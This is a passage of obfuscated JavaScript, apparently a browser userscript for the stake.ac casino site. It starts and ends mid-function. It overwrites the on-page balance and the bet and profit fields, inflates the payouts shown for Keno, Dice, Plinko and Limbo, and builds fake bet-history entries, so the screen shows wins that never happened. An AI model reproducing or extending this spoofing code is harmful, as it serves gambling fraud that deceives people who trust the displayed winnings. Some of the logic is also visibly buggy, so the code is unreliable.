    let _0x1e6dc7;
    _0x1e6dc7 = "https://stake.ac/casino/games/blackjack" === window.location.href ? document.querySelector("#main-content > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > label > div > div.input-button-wrap.svelte-1nbx5re > button:nth-child(1)") : document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > label:nth-child(2) > div > div.input-button-wrap.svelte-1nbx5re > button:nth-child(1)");
    if (_0x1e6dc7) {
      _0x1e6dc7.addEventListener("click", () => {
        if (_0x3a5df1) {
          _0x3a5df1 = false;
          const _0x4c6a0f = _0x264fba();
          const _0x309971 = parseFloat(_0x4c6a0f.innerText.replace(/[^\d.]/g, ''));
          let _0x37b345;
          let _0x5a5db8;
          if (0.5 * _0x2fe346 > _0x309971) {
            _0x2fe346 = _0x309971;
          } else {
            _0x2fe346 *= 0.5;
          }
          _0x3493c8 = true;
          _0xd8bd68 = true;
          if ('https://stake.ac/casino/games/blackjack' === window.location.href) {
            _0x37b345 = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > label:nth-child(2) > span > div.currency-conversion.svelte-e4myuj > div > div");
            _0x5a5db8 = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > label:nth-child(2) > span > div.currency-conversion.svelte-e4myuj > div > div");
          } else {
            _0x37b345 = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > label > div > div.input-content.svelte-1nbx5re > input");
            _0x5a5db8 = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > label:nth-child(2) > span > div.currency-conversion.svelte-e4myuj > div > div");
          }
          const _0x31f1ac = {
            'usd': {
              'ltc': _0x58a80a,
              'eth': _0x120044,
              'pol': _0x15c063,
              'btc': _0xfd6c3e,
              'usdt': 0x1
            },
            'eur': {
              'ltc': _0x262b8b,
              'eth': _0x124372,
              'matic': _0x21c78d,
              'btc': _0x217262
            }
          };
          let _0x2d9406;
          let _0x2d851b;
          if ("usd" === _0xbe34bd) {
            _0x2d851b = _0x2fe346;
            _0x2d9406 = _0x31f1ac.usd[_0x48a9fe];
          } else if ("eur" === _0xbe34bd) {
            _0x2d851b = _0x2fe346 * _0x124a7d;
            _0x2d9406 = _0x31f1ac.usd[_0x48a9fe];
          } else if ("inr" === _0xbe34bd) {
            _0x2d851b = _0x2fe346 / _0x368347;
            _0x2d9406 = _0x31f1ac.usd[_0x48a9fe];
          }
          const _0x45ba57 = (_0x2d851b / _0x2d9406).toFixed(0x8);
          _0x5a5db8.innerText = _0x45ba57 + " " + _0x48a9fe.toUpperCase();
          _0x37b345.value = _0x2fe346.toFixed(0x2);
          setTimeout(() => {
            _0x3a5df1 = true;
          }, 0xc8);
        }
      });
    }
    _0x274e5d = setTimeout(_0x471b5a, 0x1f4);
  }
  function _0x1ab05c() {
    _0x20235c("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-content.svelte-1ku0r3 > div > div.content.svelte-dpdqlo > div", _0x2d9b1a);
    _0x3a81cb = setTimeout(() => {
      _0x1ab05c();
    }, 0x64);
  }
  function _0x2d9b1a() {
    if (!_0xd8bd68) {
      const _0x2879fd = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-content.svelte-1ku0r3 > div > div.content.svelte-dpdqlo > div > div > span.payout-result.win.svelte-19ngaoh > div > span.content.svelte-didcjq > span > span");
      const _0x5548fb = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-content.svelte-1ku0r3 > div > div.content.svelte-dpdqlo > div > div > span.number-multiplier.svelte-19ngaoh > span");
      if (_0x5548fb && !_0x2879fd) {
        _0x1a69db = false;
        _0x28c109((_0x2fe346 * 0x1).toFixed(0x2) - 0x0);
        const _0x180be6 = _0x369ea9[_0xbe34bd];
        const _0x5fe82c = new Date();
        let _0x5bd302 = _0x5fe82c.getHours();
        const _0x3b51cb = _0x5fe82c.getMinutes();
        const _0xa85a70 = _0x5bd302 >= 0xc ? 'PM' : 'AM';
        _0x5bd302 %= 0xc;
        _0x5bd302 = _0x5bd302 || 0xc;
        const _0x264113 = _0x5bd302 + ':' + (_0x3b51cb < 0xa ? '0' : '') + _0x3b51cb + " " + _0xa85a70;
        const _0x1d3e94 = _0x180be6 + _0x2fe346.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
        _0x276961.push({
          'game': 'Keno',
          'bet_amount': _0x1d3e94,
          'payout': _0x1d3e94,
          'multiplier': 0x1.toFixed(0x2) + '×',
          'time': _0x264113
        });
      } else {
        if (_0x2879fd && _0x5548fb) {
          const _0x3955de = _0xbf0157(_0x5548fb.innerText);
          const _0x319d6a = _0x2fe346 * _0x3955de;
          _0x1a69db = false;
          _0x28c109(_0x319d6a.toFixed(0x2) - 0x0);
          const _0x29f577 = _0x369ea9[_0xbe34bd];
          _0x2879fd.innerText = _0x29f577 + _0x319d6a.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
          const _0x459f37 = new Date();
          let _0x3a5b7e = _0x459f37.getHours();
          const _0xec0d88 = _0x459f37.getMinutes();
          const _0x6087c9 = _0x3a5b7e >= 0xc ? 'PM' : 'AM';
          _0x3a5b7e %= 0xc;
          _0x3a5b7e = _0x3a5b7e || 0xc;
          const _0x232f09 = _0x3a5b7e + ':' + (_0xec0d88 < 0xa ? '0' : '') + _0xec0d88 + " " + _0x6087c9;
          const _0x3fd487 = _0x29f577 + _0x2fe346.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
          const _0x5aa706 = _0x29f577 + _0x319d6a.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
          _0x276961.push({
            'game': "Keno",
            'bet_amount': _0x3fd487,
            'payout': _0x5aa706,
            'multiplier': _0x3955de.toFixed(0x2) + '×',
            'time': _0x232f09
          });
        }
      }
      _0xd8bd68 = true;
    }
  }
  function _0x47a07a() {
    _0x36a605("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > button.inline-flex.relative.items-center.gap-2.justify-center.rounded-sm.font-semibold.whitespace-nowrap.ring-offset-background.transition.disabled\\:pointer-events-none.disabled\\:opacity-50.focus-visible\\:outline.focus-visible\\:outline-2.focus-visible\\:outline-offset-2.active\\:scale-\\[0\\.98\\].bg-green-500.text-neutral-black.betterhover\\:hover\\:bg-green-400.betterhover\\:hover\\:text-neutral-black.focus-visible\\:outline-white.text-base.leading-none.shadow-md.py-\\[1\\.125rem\\].px-\\[1\\.75rem\\]", _0x38e247);
    _0x5997d7 = setTimeout(() => {
      _0x47a07a();
    }, 0x64);
  }
  function _0x36a605(_0x544849, _0xb6c3ba) {
    const _0x61fd13 = document.querySelector(_0x544849);
    if (_0x61fd13 && 'bet-button' === _0x61fd13.dataset.test) {
      _0x61fd13.addEventListener("click", function () {
        const _0x29a2a3 = new Date().getTime();
        if (0x0 === _0x4e1066 || _0x29a2a3 - _0x4e1066 > 0xc8) {
          _0x38e247();
        }
        _0x4e1066 = _0x29a2a3;
        _0xb6c3ba(_0x61fd13);
      });
    } else {
      _0x538172 = setTimeout(() => {
        _0x36a605(_0x544849, _0xb6c3ba);
      }, 0xa);
    }
  }
  function _0x2cc116() {
    const _0x1e1c2a = _0x264fba();
    const _0x20c8f3 = parseFloat(_0x1e1c2a.innerText.replace(/[^\d.]/g, ''));
    if (0x0 !== _0x20c8f3 && _0x20c8f3) {
      localStorage.setItem('latest_bal', _0x20c8f3.toString());
    }
  }
  function _0x4482fc(_0x106bd3 = false, _0x2d9b22 = 0x7d0) {
    const _0x35269c = Date.now() + _0x2d9b22;
    !function _0x5bf9d0() {
      const _0x181b5e = _0x264fba();
      if (_0x181b5e) {
        const _0x39f586 = localStorage.getItem("latest_bal");
        if (_0x39f586) {
          const _0x3dfd46 = parseFloat(_0x39f586);
          if (!isNaN(_0x3dfd46)) {
            let _0x355123;
            if ("usd" === _0xbe34bd) {
              _0x355123 = '$' + _0x3dfd46.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
            } else if ("eur" === _0xbe34bd) {
              _0x355123 = '€' + _0x3dfd46.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
            } else if ("inr" === _0xbe34bd) {
              _0x355123 = '₹' + _0x3dfd46.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
            }
            _0x181b5e.innerText = _0x355123;
          }
        }
      }
      if (!_0x106bd3) {
        if (Date.now() < _0x35269c) {
          setTimeout(_0x5bf9d0, 0xa);
        }
      }
    }();
  }
  function _0x1e6533(_0x6ba6b) {
    const _0x30945d = _0x264fba();
    const _0x24cbe9 = parseFloat(_0x30945d.innerText.replace(/[^\d.]/g, '')) + _0x6ba6b;
    const _0x1fc3d7 = _0x369ea9[_0xbe34bd] + _0x24cbe9.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
    _0x30945d.innerText = _0x1fc3d7;
  }
  function _0x28c109(_0x20a38d) {
    if (!_0x5f5018) {
      const _0x2fcbbe = _0x264fba();
      const _0x2a031e = parseFloat(_0x2fcbbe.innerText.replace(/[^\d.]/g, '')) + _0x20a38d;
      const _0x58575a = _0x369ea9[_0xbe34bd] + _0x2a031e.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
      _0x2fcbbe.innerText = _0x58575a;
      _0x5f5018 = true;
    }
  }
  !function () {
    if (!_0x148448) {
      const _0xaa0e3d = new Image();
      _0xaa0e3d.src = "https://i.ibb.co/CM4M6YY/bomb.png";
      _0xaa0e3d.onload = () => {
        _0x148448 = _0xaa0e3d;
      };
    }
  }();
  (async function () {
    try {
      const _0xebe74f = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd");
      const _0x4ff009 = await _0xebe74f.json();
      _0x58a80a = _0x4ff009.litecoin.usd;
    } catch (_0x373cdf) {
      return 64.01;
    }
  })();
  (async function () {
    try {
      const _0x5222c6 = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd");
      const _0x5b485e = await _0x5222c6.json();
      _0xfd6c3e = _0x5b485e.bitcoin.usd;
    } catch (_0x2f4a5d) {
      return 59026.53;
    }
  })();
  (async function () {
    try {
      const _0x15bff9 = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd");
      const _0x665a2 = await _0x15bff9.json();
      _0x120044 = _0x665a2.ethereum.usd;
    } catch (_0x54a082) {
      return 2659.92;
    }
  })();
  (async function () {
    try {
      const _0x2d19b0 = await fetch('https://api.coinbase.com/v2/prices/MATIC-USD/spot');
      const _0x5319be = await _0x2d19b0.json();
      _0x15c063 = parseFloat(_0x5319be.data.amount);
    } catch (_0x4525d3) {
      return 0.379205;
    }
  })();
  (async function () {
    try {
      const _0x10db3b = await fetch("https://open.er-api.com/v6/latest/EUR");
      if (!_0x10db3b.ok) {
        throw new Error("HTTP error! Status: " + _0x10db3b.status);
      }
      const _0x3f8460 = await _0x10db3b.json();
      _0x124a7d = _0x3f8460.rates.USD;
      return void localStorage.setItem("previoususd", _0x3f8460.rates.USD);
    } catch (_0x5e9a25) {
      console.error("Error fetching USD price:", _0x5e9a25);
    }
  })();
  (async function () {
    try {
      const _0x298760 = await fetch("https://open.er-api.com/v6/latest/USD");
      if (!_0x298760.ok) {
        throw new Error("HTTP error! Status: " + _0x298760.status);
      }
      const _0x12b148 = await _0x298760.json();
      _0x368347 = _0x12b148.rates.INR;
      return void localStorage.setItem("previoususd", _0x12b148.rates.INR);
    } catch (_0x1aff55) {
      console.error("Error fetching USD price:", _0x1aff55);
    }
  })();
  localStorage.setItem("ltcrate", _0x58a80a);
  localStorage.setItem("btcrate", _0xfd6c3e);
  localStorage.setItem("ethrate", _0x120044);
  localStorage.setItem('maticrate', _0x15c063);
  _0x21c78d = _0x15c063 / _0x124a7d;
  _0x124372 = _0x120044 / _0x124a7d;
  _0x217262 = _0xfd6c3e / _0x124a7d;
  _0x262b8b = _0x58a80a / _0x124a7d;
  function _0x5cd3fd() {
    let _0x4d294b;
    if ("ltc" === _0x48a9fe) {
      _0x4d294b = document.querySelector("button[data-testid=\"coin-toggle-currency-ltc\"]");
    } else if ("eth" === _0x48a9fe) {
      _0x4d294b = document.querySelector("button[data-testid=\"coin-toggle-currency-eth\"]");
    } else if ('btc' === _0x48a9fe) {
      _0x4d294b = document.querySelector("button[data-testid=\"coin-toggle-currency-btc\"]");
    } else if ("pol" === _0x48a9fe) {
      _0x4d294b = document.querySelector("button[data-testid=\"coin-toggle-currency-pol\"]");
    } else if ("usdt" === _0x48a9fe) {
      _0x4d294b = document.querySelector("button[data-testid=\"coin-toggle-currency-usdt\"]");
    }
    if (_0x4d294b) {
      let _0x308123 = _0x4d294b.querySelector("span.weight-semibold.line-height-default.align-left.size-default.text-size-default.variant-inherit.numeric.with-icon-space.is-truncate.svelte-17v69ua[formattedforfilter=\"0\"]");
      if (_0x308123) {
        const _0x514c82 = _0x264fba();
        const _0xd61ccc = parseFloat(_0x514c82.innerText.replace(/[^\d.]/g, ''));
        if (!isNaN(_0xd61ccc)) {
          const _0x293dd6 = _0x369ea9[_0xbe34bd];
          _0x308123.textContent = _0x293dd6 + _0xd61ccc.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
          setTimeout(_0x5cd3fd, 0x1f4);
        }
      } else {
        if (_0x308123 || "pol" !== _0x48a9fe) {
          setTimeout(_0x5cd3fd, 0x32);
        } else {
          const _0x54f245 = document.querySelector("button[data-testid=\"coin-toggle-currency-pol\"]").firstElementChild.firstElementChild.firstElementChild;
          if (_0x54f245) {
            const _0x5eceb7 = _0x264fba();
            const _0x368566 = parseFloat(_0x5eceb7.innerText.replace(/[^\d.]/g, ''));
            if (!isNaN(_0x368566)) {
              const _0x11cb9f = _0x369ea9[_0xbe34bd];
              _0x54f245.textContent = _0x11cb9f + _0x368566.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
            }
          }
          setTimeout(_0x5cd3fd, 0x1f4);
        }
      }
    } else {
      setTimeout(_0x5cd3fd, 0x32);
    }
  }
  function _0x367e4d(_0x21017f) {
    if (document.querySelector(".custom-modal")) {
      return;
    }
    const _0x991c1d = function () {
      const _0x1af5dd = document.createElement("div");
      _0x1af5dd.style.position = "fixed";
      _0x1af5dd.style.top = "50%";
      _0x1af5dd.style.left = '50%';
      _0x1af5dd.style.transform = "translate(-50%, -50%)";
      _0x1af5dd.style.backgroundColor = '#36393f';
      _0x1af5dd.style.padding = '20px';
      _0x1af5dd.style.color = "white";
      _0x1af5dd.style.borderRadius = '10px';
      _0x1af5dd.style.textAlign = "center";
      _0x1af5dd.innerHTML = "\n            <h2 style=\"margin-bottom: 20px;\">Muck System</h2>\n        ";
      document.body.appendChild(_0x1af5dd);
      return _0x1af5dd;
    }();
    _0x991c1d.classList.add("custom-modal");
    const _0x1b061a = document.createElement('p');
    _0x1b061a.textContent = _0x21017f;
    _0x1b061a.style.color = "#ff4d4d";
    _0x1b061a.style.fontSize = '18px';
    _0x1b061a.style.marginTop = "20px";
    _0x1b061a.style.marginBottom = "10px";
    _0x991c1d.style.backgroundColor = "#2C2F33";
    _0x991c1d.style.color = "#ffffff";
    _0x991c1d.style.fontFamily = "Arial, sans-serif";
    _0x991c1d.style.padding = "20px";
    _0x991c1d.style.borderRadius = '10px';
    _0x991c1d.style.boxShadow = "0px 8px 16px rgba(0, 0, 0, 0.3)";
    _0x991c1d.style.textAlign = 'center';
    _0x991c1d.style.maxWidth = "450px";
    _0x991c1d.style.margin = "auto";
    const _0x4b63b2 = document.createElement("button");
    _0x4b63b2.textContent = "Close";
    _0x4b63b2.style.padding = "10px 20px";
    _0x4b63b2.style.backgroundColor = '#7289da';
    _0x4b63b2.style.color = "white";
    _0x4b63b2.style.border = 'none';
    _0x4b63b2.style.borderRadius = "5px";
    _0x4b63b2.style.cursor = "pointer";
    _0x4b63b2.style.marginTop = '10px';
    _0x4b63b2.style.fontSize = '16px';
    _0x4b63b2.style.boxShadow = "0px 4px 6px rgba(0, 0, 0, 0.1)";
    _0x4b63b2.addEventListener('click', () => {
      !function (_0x2b4d93) {
        if (_0x2b4d93) {
          document.body.removeChild(_0x2b4d93);
        }
      }(_0x991c1d);
    });
    _0x991c1d.appendChild(_0x1b061a);
    _0x991c1d.appendChild(_0x4b63b2);
  }
  function _0x116709(_0x52f5b3, _0x57394e) {
    const _0x47b626 = document.querySelector(_0x52f5b3);
    if (_0x47b626 && "bet-button" === _0x47b626.dataset.test) {
      _0x510b88 = false;
      setTimeout(() => {
        _0x116709(_0x52f5b3, _0x57394e);
      }, 0xa);
    } else {
      _0x57394e(_0x47b626);
    }
  }
  function _0x34b6dc() {
    const _0x273a99 = document.querySelector("input.input.spacing-expanded.svelte-1nbx5re[data-test='payout']");
    if (_0x273a99) {
      _0x1b304a = parseFloat(_0x273a99.value);
      _0x20c1de = _0x2fe346 * (_0x1b304a - 0x1);
      if (isNaN(_0x20c1de)) {
        _0x20c1de = 0x0;
      }
      const _0x34f2fd = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > div.profit.svelte-5v1hdl > label > div.input-wrap.svelte-1nbx5re > div > input");
      const _0x1ccf6f = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > div.profit.svelte-5v1hdl > label > div.labels.svelte-5v1hdl > span > div > div > div > div");
      if (_0x34f2fd) {
        _0x34f2fd.value = _0x20c1de.toFixed(0x2);
      }
      const _0x1544d1 = {
        'usd': {
          'ltc': _0x58a80a,
          'eth': _0x120044,
          'pol': _0x15c063,
          'btc': _0xfd6c3e,
          'usdt': 0x1
        },
        'eur': {
          'ltc': _0x262b8b,
          'eth': _0x124372,
          'matic': _0x21c78d,
          'btc': _0x217262
        }
      };
      let _0x28ffaf;
      if ('usd' === _0xbe34bd) {
        _0x28ffaf = _0x1544d1.usd[_0x48a9fe];
      } else if ("eur" === _0xbe34bd) {
        _0x20c1de *= _0x124a7d;
        _0x28ffaf = _0x1544d1.usd[_0x48a9fe];
      } else if ("eur" === _0xbe34bd) {
        _0x20c1de /= _0x368347;
        _0x28ffaf = _0x1544d1.usd[_0x48a9fe];
      }
      const _0x254c67 = (_0x20c1de / _0x28ffaf).toFixed(0x8);
      _0x1ccf6f.innerText = _0x254c67 + " " + _0x48a9fe.toUpperCase();
    }
    _0x2b74f8 = setTimeout(_0x34b6dc, 0x32);
  }
  function _0x205cde() {
    const _0x50b866 = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-content.svelte-1ku0r3 > div > div.past-bets.svelte-zjz7dr");
    if (!_0x50b866) {
      return void setTimeout(_0x205cde, 0x64);
    }
    if (_0x5ecc53) {
      _0x5ecc53.disconnect();
    }
    _0x5ecc53 = new MutationObserver(function (_0x497dc4, _0x477069) {
      for (const _0x52ab1e of _0x497dc4) if ('childList' === _0x52ab1e.type && _0x52ab1e.addedNodes.length > 0x0) {
        const _0xda4e13 = _0x52ab1e.addedNodes[_0x52ab1e.addedNodes.length - 0x1];
        if (_0xda4e13 instanceof HTMLElement && "button" === _0xda4e13.tagName.toLowerCase()) {
          if (_0xda4e13.classList.contains("variant-success")) {
            if (_0xda4e13 !== _0x111946) {
              _0x111946 = _0xda4e13;
              parseFloat(_0xda4e13.querySelector(".contents").innerText);
              const _0x31b25c = _0x2fe346 * _0x1b304a;
              const _0x44a12c = new Date();
              let _0x38bf54 = _0x44a12c.getHours();
              const _0x1823a6 = _0x44a12c.getMinutes();
              const _0x201b28 = _0x38bf54 >= 0xc ? 'PM' : 'AM';
              _0x38bf54 %= 0xc;
              _0x38bf54 = _0x38bf54 || 0xc;
              const _0x5ead6d = _0x38bf54 + ':' + (_0x1823a6 < 0xa ? '0' : '') + _0x1823a6 + " " + _0x201b28;
              const _0x1b65f4 = _0x369ea9[_0xbe34bd];
              const _0x312833 = _0x1b65f4 + _0x2fe346.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
              const _0x58626c = _0x1b65f4 + _0x31b25c.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
              _0x276961.push({
                'game': "Dice",
                'bet_amount': _0x312833,
                'payout': _0x58626c,
                'multiplier': _0x1b304a.toFixed(0x2) + '×',
                'time': _0x5ead6d
              });
              setTimeout(() => {
                _0x1e6533(_0x31b25c);
              }, 0xc8);
            }
          } else {
            if (_0xda4e13.classList.contains("variant-neutral")) {
              const _0x465df8 = _0x264fba();
              const _0x14ed1f = parseFloat(_0x465df8.innerText.replace(/[^\d.]/g, '')) - _0x2fe346;
              const _0x4c58f5 = _0x369ea9[_0xbe34bd];
              _0x14ed1f.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
              const _0x40296b = new Date();
              let _0x3e979e = _0x40296b.getHours();
              const _0x26189e = _0x40296b.getMinutes();
              const _0x57f94a = _0x3e979e >= 0xc ? 'PM' : 'AM';
              _0x3e979e %= 0xc;
              _0x3e979e = _0x3e979e || 0xc;
              const _0x528c12 = _0x3e979e + ':' + (_0x26189e < 0xa ? '0' : '') + _0x26189e + " " + _0x57f94a;
              const _0x40fdfb = _0x4c58f5 + _0x2fe346.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
              _0x276961.push({
                'game': "Dice",
                'bet_amount': _0x40fdfb,
                'payout': '-' + _0x40fdfb,
                'multiplier': '0.00×',
                'time': _0x528c12
              });
            }
          }
        }
      }
    });
    _0x5ecc53.observe(_0x50b866, {
      'childList': true
    });
  }
  function _0x25fd58() {
    const _0x5ab574 = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-content.svelte-1ku0r3 > div > div.last-bet-wrap.svelte-1hd0qmg > div");
    if (!_0x5ab574) {
      return void setTimeout(_0x25fd58, 0x64);
    }
    if (_0x278cf4) {
      _0x278cf4.disconnect();
    }
    _0x278cf4 = new MutationObserver(function (_0x1f6c1d, _0x26acc0) {
      for (const _0x470198 of _0x1f6c1d) if ("childList" === _0x470198.type && _0x470198.addedNodes.length > 0x0) {
        const _0x342948 = _0x470198.addedNodes[_0x470198.addedNodes.length - 0x1];
        if (_0x342948 instanceof HTMLElement && "button" === _0x342948.tagName.toLowerCase() && (console.log("its a button"), _0x342948 !== _0x111946)) {
          _0x111946 = _0x342948;
          let _0x2e139e = _0x342948.innerText.trim();
          let _0xfc2e2f = parseFloat(_0x2e139e.replace('×', ''));
          const _0x119e74 = _0x2fe346 * _0xfc2e2f;
          console.log(_0x119e74);
          const _0x1477c4 = new Date();
          let _0x4b1c2e = _0x1477c4.getHours();
          const _0x4ec39b = _0x1477c4.getMinutes();
          const _0x1eb748 = _0x4b1c2e >= 0xc ? 'PM' : 'AM';
          _0x4b1c2e %= 0xc;
          _0x4b1c2e = _0x4b1c2e || 0xc;
          const _0x51f8bb = _0x4b1c2e + ':' + (_0x4ec39b < 0xa ? '0' : '') + _0x4ec39b + " " + _0x1eb748;
          const _0x324f10 = _0x369ea9[_0xbe34bd];
          const _0x5eb096 = _0x324f10 + _0x2fe346.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
          const _0x23fdb9 = _0x324f10 + _0x119e74.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
          _0x276961.push({
            'game': "Plinko",
            'bet_amount': _0x5eb096,
            'payout': _0x23fdb9,
            'multiplier': _0xfc2e2f.toFixed(0x2) + '×',
            'time': _0x51f8bb
          });
          setTimeout(() => {
            _0x1e6533(_0x119e74);
          }, 0xc8);
        }
      }
    });
    _0x278cf4.observe(_0x5ab574, {
      'childList': true
    });
  }
  function _0x20235c(_0xc7003, _0x2c81e4) {
    const _0x446cd3 = document.querySelector(_0xc7003);
    if (_0x446cd3) {
      _0x2c81e4(_0x446cd3);
    } else {
      _0x5f5018 = false;
      setTimeout(() => {
        _0x20235c(_0xc7003, _0x2c81e4);
      }, 0xa);
    }
  }
  function _0xbf0157(_0x2fadc4) {
    const _0xdf4ec5 = parseFloat(_0x2fadc4.replace(/[^\d.]/g, ''));
    return isNaN(_0xdf4ec5) ? 0x0 : _0xdf4ec5;
  }
  function _0xf4e498() {
    const _0x3c2469 = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-content.svelte-1ku0r3 > div > div.past-bets.svelte-zjz7dr");
    if (!_0x3c2469) {
      return void setTimeout(_0xf4e498, 0x64);
    }
    if (_0x1abcd2) {
      _0x1abcd2.disconnect();
    }
    _0x1abcd2 = new MutationObserver(function (_0x559e47, _0xaeac05) {
      for (const _0x3ebe52 of _0x559e47) if ("childList" === _0x3ebe52.type && _0x3ebe52.addedNodes.length > 0x0) {
        const _0x3d823b = _0x3ebe52.addedNodes[_0x3ebe52.addedNodes.length - 0x1];
        if (_0x3d823b instanceof HTMLElement && "button" === _0x3d823b.tagName.toLowerCase()) {
          if (_0x40724d) {
            _0x8f3d21 = _0x3d823b;
            parseFloat(_0x3d823b.querySelector('.contents').innerText);
            const _0x1318bf = _0x2fe346 * _0x556504;
            const _0x360293 = new Date();
            let _0x2b4064 = _0x360293.getHours();
            const _0x163d0e = _0x360293.getMinutes();
            const _0x177c50 = _0x2b4064 >= 0xc ? 'PM' : 'AM';
            _0x2b4064 %= 0xc;
            _0x2b4064 = _0x2b4064 || 0xc;
            const _0x43c956 = _0x2b4064 + ':' + (_0x163d0e < 0xa ? '0' : '') + _0x163d0e + " " + _0x177c50;
            const _0x469ae2 = _0x369ea9[_0xbe34bd];
            const _0x450fd7 = _0x469ae2 + _0x2fe346.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
            const _0x3d2194 = _0x469ae2 + _0x1318bf.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
            _0x276961.push({
              'game': 'Limbo',
              'bet_amount': _0x450fd7,
              'payout': _0x3d2194,
              'multiplier': _0x556504.toFixed(0x2) + '×',
              'time': _0x43c956
            });
            return void setTimeout(() => {
              _0x1e6533(_0x1318bf);
            }, 0xc8);
          }
          if (_0x3d823b.classList.contains("variant-success")) {
            if (_0x3d823b !== _0x8f3d21) {
              _0x8f3d21 = _0x3d823b;
              parseFloat(_0x3d823b.querySelector(".contents").innerText);
              const _0x9e662f = _0x2fe346 * _0x556504;
              const _0x21ee79 = new Date();
              let _0x2a988f = _0x21ee79.getHours();
              const _0x3f9761 = _0x21ee79.getMinutes();
              const _0x777f04 = _0x2a988f >= 0xc ? 'PM' : 'AM';
              _0x2a988f %= 0xc;
              _0x2a988f = _0x2a988f || 0xc;
              const _0x57ce8c = _0x2a988f + ':' + (_0x3f9761 < 0xa ? '0' : '') + _0x3f9761 + " " + _0x777f04;
              const _0xdbeea7 = _0x369ea9[_0xbe34bd];
              const _0x5e7972 = _0xdbeea7 + _0x2fe346.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
              const _0x5b3772 = _0xdbeea7 + _0x9e662f.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
              _0x276961.push({
                'game': "Limbo",
                'bet_amount': _0x5e7972,
                'payout': _0x5b3772,
                'multiplier': _0x556504.toFixed(0x2) + '×',
                'time': _0x57ce8c
              });
              setTimeout(() => {
                _0x1e6533(_0x9e662f);
              }, 0x15e);
            }
          } else {
            if (_0x3d823b.classList.contains('variant-neutral')) {
              const _0x129d7d = _0x264fba();
              const _0x2fc89c = parseFloat(_0x129d7d.innerText.replace(/[^\d.]/g, '')) - _0x2fe346;
              const _0xf233fb = _0x369ea9[_0xbe34bd];
              _0x2fc89c.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
              const _0x2de7f5 = new Date();
              let _0x2b3d27 = _0x2de7f5.getHours();
              const _0x57cd3b = _0x2de7f5.getMinutes();
              const _0x569caa = _0x2b3d27 >= 0xc ? 'PM' : 'AM';
              _0x2b3d27 %= 0xc;
              _0x2b3d27 = _0x2b3d27 || 0xc;
              const _0x5685af = _0x2b3d27 + ':' + (_0x57cd3b < 0xa ? '0' : '') + _0x57cd3b + " " + _0x569caa;
              const _0x122faf = _0xf233fb + _0x2fe346.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
              _0x276961.push({
                'game': "Limbo",
                'bet_amount': _0x122faf,
                'payout': '-' + _0x122faf,
                'multiplier': "0.00×",
                'time': _0x5685af
              });
            }
          }
        }
      }
    });
    _0x1abcd2.observe(_0x3c2469, {
      'childList': true
    });
  }
  function _0x3f189e() {
    const _0x5c3d59 = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-content.svelte-1ku0r3 > div > div.footer.svelte-1ud3298 > label:nth-child(1) > div > div > input");
    if (_0x5c3d59) {
